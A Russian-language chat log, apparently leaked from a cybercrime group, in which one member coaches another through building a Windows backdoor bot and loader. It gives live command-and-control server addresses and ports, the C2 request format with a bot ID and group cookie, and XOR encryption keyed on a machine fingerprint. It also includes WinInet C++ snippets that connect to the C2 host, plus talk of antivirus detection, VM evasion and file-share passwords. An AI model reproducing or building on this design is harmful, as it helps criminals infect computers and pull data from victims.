Timestamp	From	To	Message
2020-07-13 12:25:33.067789	mushroom	price	Как успехи?
2020-07-13 13:39:37.509169	price	mushroom	включаюсь в тему
2020-07-13 13:40:07.610067	price	mushroom	завтра отпишусь
2020-07-13 13:40:20.263518	mushroom	price	OK.
2020-07-13 13:41:53.134943	price	mushroom	 у меня что-то github.com целый день то отрубится, то какой-то не такой без поиска вылезает
2020-07-13 13:42:17.537909	price	mushroom	не попадалось такое?
2020-07-13 13:45:15.177889	mushroom	price	Было такое, когда телеграм пытались заблокировать, и попутно кучу подсетей.
2020-07-13 13:46:07.490671	price	mushroom	я страдал целый день этим, сейчас перед тем как тебя спросить проверил-а оно работает.
2020-07-13 13:46:22.505757	price	mushroom	Но реально я первый раз в жизни увидел
2020-07-13 13:46:25.890830	price	mushroom	такоке
2020-07-13 13:47:31.590290	price	mushroom	ты всякие обманы делал ВМ и дебага? я пока просто спрашиваю, сначала функционал буду делать
2020-07-13 13:48:04.005800	price	mushroom	или это вообще не критично?
2020-07-13 13:48:19.085873	mushroom	price	Нет. Не делал. Пока не критично.
2020-07-13 13:48:28.389114	price	mushroom	хорошо
2020-07-14 14:02:30.266500	mushroom	price	Привет. Начал что делать? С какого числа будешь делать?
2020-07-14 14:02:52.508023	price	mushroom	да хоть с сегодня
2020-07-14 14:03:07.168601	price	mushroom	но перед делать надо вопросы прояснитьь
2020-07-14 14:03:09.857863	price	mushroom	а их много
2020-07-14 14:03:40.675536	price	mushroom	с Бузой уже сегодня поговорил, он мне про эмеркойны рассказал
2020-07-14 14:04:03.369138	price	mushroom	подскажи мне пожалуйста про те адреса, что мне дали
2020-07-14 14:04:15.012748	price	mushroom	на один я сходил, он называется ботнет
2020-07-14 14:04:28.777881	price	mushroom	что там можно делать?
2020-07-14 14:04:35.544171	mushroom	price	Какие адреса?
2020-07-14 14:05:27.134676	price	mushroom	 https://51.89.125.28:12280
2020-07-14 14:05:47.082837	price	mushroom	тестовый сервере где будешь тестировать работу
2020-07-14 14:05:51.149351	mushroom	price	Это сервер который командует твоим ботом.
2020-07-14 14:05:57.840572	price	mushroom	Адрес для подключения в программе для бэкдор http://51.89.125.28:12232
2020-07-14 14:06:08.123799	price	mushroom	 Для загрузчика http://51.89.125.28:12234
2020-07-14 14:06:12.984233	mushroom	price	Ты будешь через него команды давать своей программе.
2020-07-14 14:06:56.953377	price	mushroom	язашел на него, там набор адресов, с расширением базар
2020-07-14 14:06:59.048568	mushroom	price	http://51.89.125.28:12232 адрес сервера для бота, http://51.89.125.28:12234 для загрузчика.
2020-07-14 14:07:33.989264	mushroom	price	Это для программ, на эти адреса запросы будешь посылать в программах.
2020-07-14 14:08:39.460182	mushroom	price	базар пока не нужен, используй эти адреса. Когда сделаешь что с этими адресами работает, тогда можно базар адреса прикручивать.
2020-07-14 14:09:02.825521	price	mushroom	то есть посылать на адрес бота, а получать с с другого адреса?
2020-07-14 14:09:19.049812	price	mushroom	пока мне не понятно
2020-07-14 14:09:32.643983	price	mushroom	я думал надо куда-то программу разместиить и запустить
2020-07-14 14:10:04.009486	mushroom	price	Не надо пока размещать программу.
2020-07-14 14:10:41.374517	price	mushroom	а как тогда  "используй эти адреса."
2020-07-14 14:11:02.997821	price	mushroom	на них коннект надо выдать?
2020-07-14 14:11:21.269606	mushroom	price	Программа бот подключается по адресу для бота, посылает запрос как в ТЗ сказано на адрес бота, получает в ответ команду, выполняет, отправляет результат на адрес бота. Всё по протоколу http.
2020-07-14 14:11:40.589442	mushroom	price	Смотри как Wininet работает.
2020-07-14 14:11:43.478842	price	mushroom	и это все с моего компа,  пока
2020-07-14 14:11:58.782387	price	mushroom	это я посмотрел, и работал уже
2020-07-14 14:12:08.780809	mushroom	price	Да. Можешь с виртуальной машины. Как удобно.
2020-07-14 14:13:09.854181	mushroom	price	Сделай это всё для команды 1 (получить информацию о системе).
2020-07-14 14:13:26.593626	mushroom	price	С начала до конца.
2020-07-14 14:14:07.061450	mushroom	price	Команды боту своему на тестовом сервере давай.
2020-07-14 14:14:41.779527	mushroom	price	вкладка bots
2020-07-14 14:14:43.231035	price	mushroom	там типа командной строки есть? я искал ничего не заметил
2020-07-14 14:15:39.542616	mushroom	price	Как только сделаешь как в ТЗ запрос команды, там твой бот появится в списке. И можно будет давать ему команды.
2020-07-14 14:15:52.864822	mushroom	price	Там типа GUI.
2020-07-14 14:19:05.213139	price	mushroom	типа экспортом(стрелочкой в правом углу)?
2020-07-14 14:19:24.659229	mushroom	price	Да.
2020-07-14 14:19:26.625353	price	mushroom	потом в блокноте хтмл ппоявляется и его можно как надо поправить?
2020-07-14 14:20:09.060088	mushroom	price	Там вообще ничего делать не нужно. Бота твоего нету ещё.
2020-07-14 14:20:19.870255	price	mushroom	я на будущее
2020-07-14 14:20:38.102026	price	mushroom	теперь то понятно куда обращаться и он быстро там появится
2020-07-14 14:21:12.523841	mushroom	price	На будущее в списке будет твой бот и справа будет кнопка для того чтобы перейти на вкладку где можно давать команды ему.
2020-07-14 14:21:35.412390	price	mushroom	хорошо
2020-07-14 14:22:17.115242	mushroom	price	Тебе буза сделал на redmine учётную запись и проект, чтобы ты туда писал трудозатраты и что делаешь?
2020-07-14 14:22:39.473910	price	mushroom	думаю, что нет - он мне не говорил
2020-07-14 14:24:05.415476	mushroom	price	Я ему скажу. Начинай делать. Потом ещё сделают тебе на Gitlab учётную запись для проектов твоих.
2020-07-14 14:24:26.270715	price	mushroom	у меня там всё есть
2020-07-14 14:24:39.978311	price	mushroom	это я делал
2020-07-14 14:25:08.036477	mushroom	price	На Gitlab есть уже? Который .onion
2020-07-14 14:25:19.993192	price	mushroom	да
2020-07-14 14:26:29.364169	price	mushroom	(офтопно) я подготовил инструкцию по интеграции гитлаба в студию, если интересует, могу послать
2020-07-14 14:29:02.186348	mushroom	price	Шли.
Для бота сделаешь тогда как я писал выше. Выполнение команды 1, скажешь. Закоммитишь на Gitlab, названия для проектов я скажу.
2020-07-14 14:29:40.486361	price	mushroom	хорошо
2020-07-14 14:34:58.191713	mushroom	price	Избегай использования стандартной библиотеки. Если есть аналог в функции в WinApi используй его. Например вместо memcpy CopyMemory, вместо alloc HeapAlloc, вместо free HeapFree и т.д.
2020-07-14 14:35:26.807009	price	mushroom	ок
2020-07-15 14:47:42.663707	mushroom	price	Не начал делать ещё? У тебя ещё какие проекты есть?
2020-07-15 14:48:15.180966	price	mushroom	начал делать
2020-07-15 14:48:22.465231	price	mushroom	есть проекты в доделке
2020-07-15 14:48:38.171973	price	mushroom	но у меня чтото не подписывает строку программа
2020-07-15 14:48:52.513878	price	mushroom	сегодня часа два её безуспешно отлаживал
2020-07-15 14:49:22.600154	mushroom	price	criptosign которая?
2020-07-15 14:49:26.796426	price	mushroom	говорит что ошибка импорта
2020-07-15 14:50:06.312605	price	mushroom	не может открыть файл, но когда попроще директорию в с:\ делаю, то открывает
2020-07-15 14:50:41.938362	price	mushroom	но потом не может все равно подписать - вываливается уже на собственно подписи
2020-07-15 14:51:00.197520	mushroom	price	Какая программа?
2020-07-15 14:51:28.520214	mushroom	price	Ты про какую говоришь?
2020-07-15 14:51:48.615224	price	mushroom	cryptosign.sln
2020-07-15 14:52:44.584871	mushroom	price	А зачем ты её отлаживаешь. Она тебе не нужна. Из неё надо код проверки подписи взять и вставить в загрузчик и бот.
2020-07-15 14:52:49.926056	price	mushroom	оба ключа делает, но потом на подписи строки не получается
2020-07-15 14:53:09.479360	price	mushroom	я не отлаживаю, просто не подписывает
2020-07-15 14:53:31.441996	mushroom	price	И ключи не надо делать. Я дам тебе ключ.
2020-07-15 14:53:53.827434	price	mushroom	зачем тогда программу высылали?
2020-07-15 14:54:02.547498	price	mushroom	давай ключ
2020-07-15 14:54:30.296937	mushroom	price	Чтобы ты код из неё взял.
2020-07-15 14:54:42.757469	price	mushroom	так код не работает
2020-07-15 14:54:42.758867	price	mushroom	так код не работает
2020-07-15 14:54:54.149565	price	mushroom	или что нужно взять работает?
2020-07-15 14:55:42.725014	price	mushroom	как раз шифрование и не работает
2020-07-15 14:57:12.510765	mushroom	price	Работает.
2020-07-15 14:57:24.701972	mushroom	price	cryptosign.exe --gen pub.key priv.key
2020-07-15 14:57:32.218727	mushroom	price	cryptosign.exe --sign HELLO --bin priv.key
2020-07-15 14:58:07.105615	mushroom	price	cryptosign.exe --verify HELLO pub.key <то что вывела предыдущая команда>
2020-07-15 14:58:13.430169	mushroom	price	Всё работает.
2020-07-15 14:58:30.093940	mushroom	price	Подписал строку HELLO и проверил.
2020-07-15 14:58:33.616208	price	mushroom	    if (!crypter.importKey(keyBlob, keyBlobSize, isPrivate))
    {
        cout << "Import key error" << endl;
        HeapFree(GetProcessHeap(), 0, keyBlob);
        return false;
    }
2020-07-15 14:58:58.406719	price	mushroom	crypter.importKey вываливается
2020-07-15 14:59:34.100395	price	mushroom	--sign "Signed text!!!" --base64 c:\mysign\private.key
2020-07-15 14:59:40.501203	price	mushroom	вот параметры
2020-07-15 15:00:02.904069	price	mushroom	если не близко к корню, то вываливается - не видит файла
2020-07-15 15:00:10.921896	mushroom	price	А ключ ты делал base64?
2020-07-15 15:00:40.239185	mushroom	price	По умолчани ключи делаются как --bin.
2020-07-15 15:00:55.104838	price	mushroom	скорее всего, сейчас точно не помню,  но я из примера брал
2020-07-15 15:01:22.875303	mushroom	price	То что я сверху написал сделай.
2020-07-15 15:01:32.768424	price	mushroom	то есть не 64
2020-07-15 15:01:39.273160	price	mushroom	ок
2020-07-15 15:01:56.220791	mushroom	price	Чтобы base64 надо указать параметр --base64
2020-07-15 15:02:13.288355	mushroom	price	--gen --base64 например
2020-07-15 15:02:38.879751	price	mushroom	у меня всё в батах, и там - cryptosign --gen --base64 private.key public.key
2020-07-15 15:02:41.324040	mushroom	price	По этому и импортировать не может, формат не правильно указан.
2020-07-15 15:03:07.736628	price	mushroom	я поэтому и не помню
2020-07-15 15:03:31.764851	price	mushroom	сейчас переделаю как у тебя
2020-07-15 15:04:11.131112	price	mushroom	ещё у меня наоборот публичный и приватный ключи написаны
2020-07-15 15:04:24.062098	price	mushroom	по сравнению с тобой
2020-07-15 15:05:01.747843	mushroom	price	С base64:
cryptosign.exe --gen --base64 pub.key priv.key
cryptosign.exe --sign HELLO --base64 priv.key
cryptosign.exe --verify HELLO --base64 pub.key <подпись>
2020-07-15 15:05:12.486791	mushroom	price	Сейчас у себя сделал, всё работает.
2020-07-15 15:05:29.797796	price	mushroom	разница только в порядке,  может это и проблема
2020-07-15 15:05:55.061042	mushroom	price	Сгенерировал ключи, подписал, проверил подпись.
2020-07-15 15:06:02.228069	mushroom	price	А у тебя какок порядок?
2020-07-15 15:06:10.610573	price	mushroom	как в инструкции
2020-07-15 15:06:12.105486	price	mushroom	cryptosign --gen --base64 private.key public.key
2020-07-15 15:06:23.876600	mushroom	price	А дальше?
2020-07-15 15:06:38.098820	price	mushroom	cryptosign --sign "Signed text!!!" --base64 private.key
2020-07-15 15:06:49.507378	mushroom	price	И дальше?
2020-07-15 15:07:01.399016	price	mushroom	дальше у меня не идёт
2020-07-15 15:07:14.648025	price	mushroom	
cryptosign --verify "Signed text!!!" --base64 public.key JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT
2020-07-15 15:07:30.587332	mushroom	price	Это подпись
2020-07-15 15:07:32.081545	mushroom	price	JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT
2020-07-15 15:07:43.048459	price	mushroom	кстати в ключах должны стоять CRLF или нет?
2020-07-15 15:07:57.349343	price	mushroom	подпись я собирался из ключа брать
2020-07-15 15:08:05.286178	price	mushroom	ту что я тебе отослал сейчас из примера
2020-07-15 15:08:15.667258	mushroom	price	Вот подпись: JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT
2020-07-15 15:08:35.032393	mushroom	price	Она генерируется всегда.
2020-07-15 15:09:03.314643	price	mushroom	у меня вроде такая же
2020-07-15 15:09:09.932196	mushroom	price	Третью команду сделай.
2020-07-15 15:09:21.826892	mushroom	price	С подписью которую получил на второй команде.
2020-07-15 15:09:40.053931	price	mushroom	хорошо, сейчас сижу делаю
2020-07-15 15:11:05.526468	mushroom	price	Ты README читал для criptosign?
2020-07-15 15:11:31.924032	price	mushroom	конечно, я оттуда примеры брал
2020-07-15 15:13:22.686325	mushroom	price	Ну что проверяет подпись?
2020-07-15 15:14:41.323289	mushroom	price	А как ты из ключа подпись хотел брать?
2020-07-15 15:15:12.239005	mushroom	price	Ключ её генерирует только. А потом проверяет.
2020-07-15 15:15:35.970399	mushroom	price	Приватный генерирует, публичный проверяет.
2020-07-15 15:16:06.726862	mushroom	price	Подпись здесь всегда в формате base64
2020-07-15 15:16:22.561831	mushroom	price	А ключи могут быть как base64 так и просто двоичные.
2020-07-15 15:17:15.307732	price	mushroom	вот получил
2020-07-15 15:17:16.524868	price	mushroom	cryptosign --verify "HELLO" --base64 pub.key JxD62J/VzpE55ZOu0G7dPvBhJT2wJsaP8sHt6PuA/ijYQQFsW+0HwraCcCeZ3q3tEk1gN68dWUhs4b4134xaAgb74DtaxM52zrPu5X49t5AVek3ObZlYAFYWYnTNRFOS
Verified
2020-07-15 15:17:25.566823	price	mushroom	проблема закрыта
2020-07-15 15:17:28.180019	mushroom	price	Прокатило.
2020-07-15 15:17:33.868971	price	mushroom	да
2020-07-15 15:17:47.351452	price	mushroom	фейковая инструкция
2020-07-15 15:18:52.894003	price	mushroom	а с файлами не буду разбирать, хотя странно-у меня не так глубоко директория сидит, и никаких кириллиц нет
2020-07-15 15:19:36.007658	price	mushroom	и путь полный указывал
2020-07-15 15:19:54.924253	mushroom	price	Там формат наверное не тот был.
2020-07-15 15:20:16.787233	mushroom	price	Вот тебе ключ:
Download: https://qaz.im/load/3i6RHF/GQSNkR   
Delete: https://qaz.im/index.php?a=delete&q=1180917199
Пароль: mPJ]u3/Z<4+}S\hG4
2020-07-15 15:20:58.320383	mushroom	price	Прошьёшь в программе как массив байт. Он в двоичном формате. Для проверки подписи даты, которая будет приходить с сервера.
2020-07-15 15:21:01.818743	price	mushroom	в смысле текстовый, а надо бинар? или наоборот?
2020-07-15 15:21:23.358406	mushroom	price	Кто текстовый?
2020-07-15 15:21:45.858589	price	mushroom	понял про формат
2020-07-15 15:22:09.222001	price	mushroom	но он реально createfile вываливал с -1
2020-07-15 15:22:38.624628	mushroom	price	Может он открыт был где.
2020-07-15 15:22:49.099831	price	mushroom	не думаю
2020-07-15 15:22:56.700602	mushroom	price	Надо было GetLastError посмотреть.
2020-07-15 15:23:03.863281	price	mushroom	я имя менял, та же петрушка
2020-07-15 15:23:10.465630	price	mushroom	вот там и смотрел
2020-07-15 15:23:14.687415	price	mushroom	902 чтоли
2020-07-15 15:23:28.566021	price	mushroom	он же в мсдн файла нет
2020-07-15 15:23:47.843811	price	mushroom	ладно забей, дальше двигаемся
2020-07-15 15:24:13.478310	mushroom	price	Сделай команду 1 полностью.
2020-07-15 15:24:38.392762	mushroom	price	На тестовом сервере подписи пока нет. Можешь пока не проверять.
2020-07-15 15:26:14.062325	mushroom	price	Шифрования я давал пример?
2020-07-15 15:26:32.890746	mushroom	price	xor шифрование всего что с сервера и на сервер приходит.
2020-07-15 15:30:56.900161	price	mushroom	Шифрования я давал пример?
2020-07-15 15:30:56.902152	price	mushroom	xor шифрование всего что с сервера и на сервер приходит.
2020-07-15 15:36:41.292289	mushroom	price	[18:26:15] <mushroom> Шифрования я давал пример? 
[18:26:33] <mushroom> xor шифрование всего что с сервера и на сервер приходит.
2020-07-15 15:39:19.551818	price	mushroom	давал
2020-07-15 15:39:32.178905	price	mushroom	SIZE_T Crypter::cryptXor
2020-07-15 15:39:48.461957	mushroom	price	Значит всё есть.
2020-07-15 15:40:50.150200	mushroom	price	Генерируй id как в ТЗ, запрос команды как в ТЗ, на тестовом сервере команду Get System info дай, получи, выполни, отправь результат на сервер.
2020-07-15 15:41:34.513145	mushroom	price	У тебя группа price.
2020-07-15 15:41:40.297944	price	mushroom	да
2020-07-16 09:02:03.595892	price	mushroom	привет
2020-07-16 09:02:33.532574	price	mushroom	подскажи про "Предлагается использовать md5-хэш от строки 
"дата_создания%windir%.имя_компьютера.дата_создания%windir\system32%.имя_домена_или_workgroup""
2020-07-16 09:02:50.929807	price	mushroom	это то, что cryptXor выдаст?
2020-07-16 09:03:15.672431	price	mushroom	и какой key для шифрования?
2020-07-16 09:03:51.963321	price	mushroom	ну и остальное всё, дата_создания - модуля бота?
2020-07-16 09:04:36.744574	price	mushroom	имя_компьютера.дата_создания?
2020-07-16 09:04:51.585104	price	mushroom	windir - c:\windows?
2020-07-16 09:05:07.703847	price	mushroom	тогда что такое windir\system32?
2020-07-16 09:07:29.135212	mushroom	price	windir папка системы, если система в C:\Windows, значит windir\system32 это C:\Windows\System32
2020-07-16 09:08:39.332786	price	mushroom	там не там знак процента стоит
2020-07-16 09:09:12.821378	mushroom	price	Значит опечатка.
2020-07-16 09:09:23.691745	price	mushroom	%windir%\system32  - вот так надо, а в ТЗ %windir\system32%
2020-07-16 09:09:41.483858	price	mushroom	теперь про шифрование и даты создания
2020-07-16 09:09:54.807492	mushroom	price	Опечатка. Папка System32  может быть только в папке системы.
2020-07-16 09:12:04.221466	price	mushroom	шифруется одним байтом или какой-то  ключевой строкой (типа private.key?)?
2020-07-16 09:12:33.996807	price	mushroom	и что там за даты создания?
2020-07-16 09:13:15.814882	mushroom	price	md5-хэш от строки это будет id твоего бота и одновременно ключ для xor шифрования.
2020-07-16 09:13:29.254253	mushroom	price	Даты создания, это дата создания папки Windows.
2020-07-16 09:13:39.641772	price	mushroom	а лучше пример, что я в Get должен послать, чтобы мне сервер ответил, а так он ошибку присылает 404
2020-07-16 09:14:07.790029	price	mushroom	там две даты создания, одни и те же?
2020-07-16 09:15:28.351567	mushroom	price	md5 хеш сделал от строки, это получается массив байт, для xor шифрования подходит, для отправки на сервер это массив байт переводи в хекс строку и посылай типа так GET /<хекс>/2
2020-07-16 09:15:36.579183	price	mushroom	видимо да, поскольку у system32 такая же дата
2020-07-16 09:16:35.943902	mushroom	price	Ты можешь извернуться и дату другую вставить, главное чтобы у бота на определённом компьютере всегда был один и тот же id не зависимо от пользователя, который его запустил.
2020-07-16 09:16:56.479890	mushroom	price	У меня одна и та же дата. С точностью до мсек.
2020-07-20 11:37:48.066391	mushroom	price	Привет Buza сказал что у тебя ест учётная запись на redmine. Он тебе сейчас проект заведёт для загрузчика и бота. Будешь туда писать что делаешь и трудозатраты.
2020-07-20 11:38:07.878127	price	mushroom	хорошо
2020-07-20 11:38:10.353640	mushroom	price	Кстати что делаешь по ним?
2020-07-20 11:38:14.005182	price	mushroom	как зайти на сервер
2020-07-20 11:38:18.386697	price	mushroom	?
2020-07-20 11:38:53.174949	mushroom	price	На какой?
2020-07-20 11:38:58.565544	price	mushroom	я собрал всю информацию о системе, зашифровал и отксорил, но запрос приходит  404
2020-07-20 11:39:17.110669	price	mushroom	после этого - дорога открыта
2020-07-20 11:39:29.984673	price	mushroom			HINTERNET hConnect =
			InternetConnect(
				hInternet,
				TEXT("51.89.125.28"),//<----   IP
				12232,// <----   port on IP       INTERNET_DEFAULT_HTTP_PORT      ->      INTERNET_PORT nServerPort,
				NULL, NULL,//LPCSTR        lpszUserName,LPCSTR        lpszPassword,
				INTERNET_SERVICE_HTTP,//DWORD         dwService,
				0,//DWORD         dwFlags,
				1u//DWORD_PTR     dwContext
			);
2020-07-20 11:39:42.916766	price	mushroom	вот так открываю, нормально
2020-07-20 11:41:19.426847	price	mushroom	а вот что здесь писать?
2020-07-20 11:41:21.095122	price	mushroom				LPCWSTR sget = L"System";
			HINTERNET hRequest =
				HttpOpenRequest(
					hConnect,
					TEXT("GET"),
					sget,
					NULL,
					NULL,
					0,
					INTERNET_FLAG_KEEP_CONNECTION,
					1);
2020-07-20 11:41:27.120556	mushroom	price	По шагам скажи. Как делаешь полный цыкл выполнения команды. Начиная с того как её запрашиваешь.
2020-07-20 11:41:36.787053	price	mushroom	не помню уже причем тут System
2020-07-20 11:42:17.779161	mushroom	price	Ни при чём её не должно быть.
2020-07-20 11:42:41.386904	mushroom	price	Сначала ты создаешь id для бота?
2020-07-20 11:42:56.477345	mushroom	price	В начале работы программы.
2020-07-20 11:43:16.231398	price	mushroom	InternetOpen -> InternetConnect -> HttpAddRequestHeadersA  for cookies->HttpOpenRequest->InternetReadFile
2020-07-20 11:43:44.875867	price	mushroom	с обычного сайта всё читаю, проблема откуда команда придёт прочитать
2020-07-20 11:43:56.038695	mushroom	price	ВО всех запросах должен быть id.
2020-07-20 11:44:00.950862	price	mushroom	ид создаю
2020-07-20 11:44:10.458116	mushroom	price	И куки с твоей группой.
2020-07-20 11:44:20.914573	price	mushroom	вот посмотри на мою цепочку wininet
2020-07-20 11:44:23.659842	mushroom	price	Покажи запрос команды.
2020-07-20 11:44:28.982264	price	mushroom	какие там должны быть функции
2020-07-20 11:45:49.274705	price	mushroom	я только подготовил формирование ид, вопросы по формату дат создания (или вообще фиолетово и они только для уникальности?)
2020-07-20 11:46:10.952026	price	mushroom	куки с групой - это HttpAddRequestHeadersA
2020-07-20 11:46:29.334400	mushroom	price	Для уникальности. Чтобы один компьютер уникально отличался от другого.
2020-07-20 11:46:33.853963	price	mushroom	нормально завершается но не понятно куда её монтировать
2020-07-20 11:46:44.773164	price	mushroom	то есть формат ИД любой
2020-07-20 11:47:04.501844	price	mushroom	с  проюелами без с расшифровкой дат или числами - всё равно
2020-07-20 11:47:25.261665	price	mushroom	извини у  меня жена с ребёнком на камчатку удлетают
2020-07-20 11:47:29.929671	price	mushroom	я на такси их посажу
2020-07-20 11:47:36.580941	mushroom	price	InternetOpen -> InternetConnect -> httpOpenRequest -> httpSendRequest
2020-07-20 11:47:38.603539	price	mushroom	свяжусь попозже
2020-07-20 11:47:39.923546	mushroom	price	Давай.
2020-07-20 15:02:59.409577	price	mushroom	привет,здесь ещё?
2020-07-20 15:03:24.360803	mushroom	price	Здесь.
2020-07-20 15:04:07.765997	price	mushroom	у нас практически одинаковые цепочки, подскажи в какой функции какие реальные параметры надо поставить
2020-07-20 15:04:49.018452	price	mushroom	кстати, вот так я куки хотел писать
2020-07-20 15:04:50.723750	price	mushroom			char* lpszHeaders = (char*)"Cookie: group=price";
		DWORD dwHeadersLength = strlen(lpszHeaders);
		HttpAddRequestHeadersA(hInternet, lpszHeaders, dwHeadersLength,	HTTP_ADDREQ_FLAG_ADD);
2020-07-20 15:05:17.404824	price	mushroom	№1
2020-07-20 15:05:19.194868	price	mushroom			InternetOpen(
			TEXT("WinInet Communication"),
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL, NULL,
			0);
2020-07-20 15:05:27.465002	price	mushroom	это просто открываем
2020-07-20 15:05:40.479388	price	mushroom	№2
2020-07-20 15:05:42.184381	price	mushroom			HINTERNET hConnect =
			InternetConnect(
				hInternet,
				TEXT("51.89.125.28"),//<----   IP
				12232,// <----   port on IP       INTERNET_DEFAULT_HTTP_PORT      ->      INTERNET_PORT nServerPort,
				NULL, NULL,//LPCSTR        lpszUserName,LPCSTR        lpszPassword,
				INTERNET_SERVICE_HTTP,//DWORD         dwService,
				0,//DWORD         dwFlags,
				1u//DWORD_PTR     dwContext
			);
2020-07-20 15:06:05.816858	price	mushroom	вот тут правильно?
2020-07-20 15:06:42.697441	mushroom	price	Да правильно.
2020-07-20 15:06:54.761440	mushroom	price	Вот так у меня:
2020-07-20 15:06:56.362101	mushroom	price	internetConnect(g_inet, host, port, NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0);
2020-07-20 15:07:20.891282	price	mushroom	ладно
2020-07-20 15:07:26.966615	mushroom	price	Потом:
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);
2020-07-20 15:07:27.631482	price	mushroom	потом я куки ставлю
2020-07-20 15:07:57.692611	mushroom	price	Потом:
httpSendRequest(req, headers, headersLen, body, bodySize)
2020-07-20 15:08:04.784442	price	mushroom	короче напиши как у тебя я также попробую и поставлю уже ИД
2020-07-20 15:08:15.176234	mushroom	price	Куки находятся в headers, headersLen.
2020-07-20 15:08:25.864180	mushroom	price	В ручную в заголовок их пиши.
2020-07-20 15:08:32.167187	price	mushroom	понял
2020-07-20 15:08:43.822897	mushroom	price	Так как ты делаешь сейчас на Windows Server не прокатывает.
2020-07-20 15:09:26.344184	mushroom	price	method это GET, path это /<id сгенерированный>/2
2020-07-20 15:09:39.108623	mushroom	price	Это запрос для получения команды с сервера.
2020-07-20 15:10:07.370617	price	mushroom	слешы реально стоят а внутри всё что ИД?
2020-07-20 15:10:16.126681	mushroom	price	body, bodySize пустые (NULL и 0).
2020-07-20 15:10:23.135307	mushroom	price	Да.
2020-07-20 15:10:26.688065	price	mushroom	ок
2020-07-20 15:11:11.862331	price	mushroom	всё, понятно, спасибо
2020-07-20 15:11:19.108173	price	mushroom	вот ещё
2020-07-20 15:11:51.991244	price	mushroom	я установленные приложения перечислил,их 463, их как передавать?
2020-07-20 15:13:48.393907	mushroom	price	Там всё передаётся в формате url encoded. Я тебе пришлю сейчас пример информации.
2020-07-20 15:14:07.560665	price	mushroom	давай
2020-07-20 15:22:48.730318	mushroom	price	Download: https://qaz.im/load/D2ASba/9zDSYN   
Delete: https://qaz.im/index.php?a=delete&q=329620950
Пароль: D1d+y?&UsOwdAD:1K
2020-07-20 15:23:14.942445	price	mushroom	спасибо
2020-07-20 15:23:17.318837	mushroom	price	Всё что посылаешь на сервер должно быть в в кодировке utf-8.
2020-07-20 15:35:36.289217	mushroom	price	Твой проект в redmine https://mk6gwg6mwnn6if33.onion/projects/bdspider
2020-07-20 15:36:02.544704	price	mushroom	ok
2020-07-20 15:36:04.052216	mushroom	price	Пиши что делаешь там и время. Сам разбей себе на подзадачи свой проект.
2020-07-21 15:23:51.524265	mushroom	price	Привет у тебя в проекте на redmine ничего не написано что ты делал и делаешь.
2020-07-21 15:24:36.866638	price	mushroom	так делаю же, кстати и вопрос
2020-07-21 15:24:49.212377	price	mushroom	всю работу запланировать
2020-07-21 15:24:59.730320	price	mushroom	и как отчитывать каждый день
2020-07-21 15:25:05.374598	price	mushroom	?
2020-07-21 15:25:30.816962	mushroom	price	Каждый день пиши туда что делаешь.
2020-07-21 15:25:48.329133	price	mushroom	антивирус как найти? по реестру?
2020-07-21 15:26:26.299080	mushroom	price	Не знаю, я по другому нахожу.
2020-07-21 15:26:31.231892	price	mushroom	то есть с вечера смотрю что надо завтра сделать и пишу вот то-то и то--то а вечером пишу что сделал?
2020-07-21 15:26:45.853415	price	mushroom	понял про АВ
2020-07-21 15:27:47.330895	mushroom	price	Просто задачи себе создаёшь в проекте, ставишь статус в работе, то что делаешь, в конце дня добавил в эту задачу трудозатраты. Сколько её занимался.
2020-07-21 15:28:17.057356	price	mushroom	понял на завтра напишу
2020-07-23 11:18:10.268415	mushroom	price	Привет. Что на данный момент сделал?
2020-07-23 11:18:32.014019	price	mushroom	письмо тебе пишу
2020-07-23 11:18:50.699146	price	mushroom	уперся в получение ответа с сервера
2020-07-23 11:19:22.943779	price	mushroom	всё прилизано, в чём дело не пойму (и твой пример перед глазами)
2020-07-23 11:19:44.821691	price	mushroom	запусти его пожалуйста, он очень простой
2020-07-23 11:20:38.186372	mushroom	price	Я пример не давал.
2020-07-23 11:21:20.015759	price	mushroom	давал, как у тебя реализована работа по http
2020-07-23 11:21:28.865836	mushroom	price	Нет.
2020-07-23 11:21:37.022003	mushroom	price	Буза может давал.
2020-07-23 11:21:37.695045	price	mushroom	[20.07.2020 18:07:57] <mushroom> Потом:		httpSendRequest(req, headers, headersLen, body, bodySize)
[20.07.2020 18:08:15] <mushroom>                                 Куки находятся в headers, headersLen.В ручную в заголовок их пиши.
[20.07.2020 18:08:44] <mushroom> Так как ты делаешь сейчас на Windows Server не прокатывает.
[20.07.2020 18:09:39] <mushroom> Это запрос для получения команды с сервера.
[20.07.2020 18:10:16] <mushroom> body, bodySize пустые(NULL и 0).
2020-07-23 11:21:56.340614	mushroom	price	Этот только запрос.
2020-07-23 11:22:14.821218	mushroom	price	Потом читаешь req.
2020-07-23 11:22:17.885923	price	mushroom	e vtyz rfr hfp Get и не идет
2020-07-23 11:22:22.011025	mushroom	price	Там ответ будет.
2020-07-23 11:22:31.720737	price	mushroom	у меня как раз это и не идет
2020-07-23 11:22:38.190560	price	mushroom	или говорит что 404
2020-07-23 11:22:41.302693	price	mushroom	или 400
2020-07-23 11:23:03.662339	mushroom	price	Запрос покажи.
2020-07-23 11:23:12.628735	mushroom	price	Путь, заголовок.
2020-07-23 11:23:25.758530	price	mushroom	сейчас пришлю текстовый файлик
2020-07-23 11:23:26.001139	mushroom	price	Адрес тоже.
2020-07-23 11:23:41.530013	price	mushroom	там всё будет и ИД
2020-07-23 11:23:47.358181	price	mushroom	и пути
2020-07-23 11:24:12.182575	price	mushroom	я все варианты изучил (странно что либо 404 либо 400 ошибку выдает)
2020-07-23 11:24:38.834392	price	mushroom	если флаг ставлю про кукиз
2020-07-23 11:24:48.052118	price	mushroom	как у  тебя
